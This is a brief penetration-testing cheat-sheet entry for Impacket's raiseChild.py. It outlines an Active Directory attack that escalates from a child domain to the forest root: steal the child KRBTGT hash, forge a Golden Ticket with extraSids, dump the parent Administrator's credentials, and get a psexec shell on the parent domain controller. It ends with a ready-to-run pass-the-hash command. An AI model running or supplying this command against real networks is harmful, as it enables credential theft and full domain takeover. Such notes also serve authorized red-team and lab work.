# raiseChild (imp)

% impacket-kerberos, windows, kerberos, 88

## shi history child-domain to forest privilege escalation (pth) 
#plateform/linux #target/local  #cat/ATTACK/EXPLOIT
golden + extraSids
- Retrieves the hash for the KRBTGT account in the child domain
- Creates a Golden Ticket
- Logs into the parent domain
- Retrieves credentials for the Administrator account in the parent domain
- authenticates to the parent domain's Domain Controller via Psexec (-target-exec ip)
```
raiseChild.py -debug -hashes :<nt_hash> <domain>/administrator
```
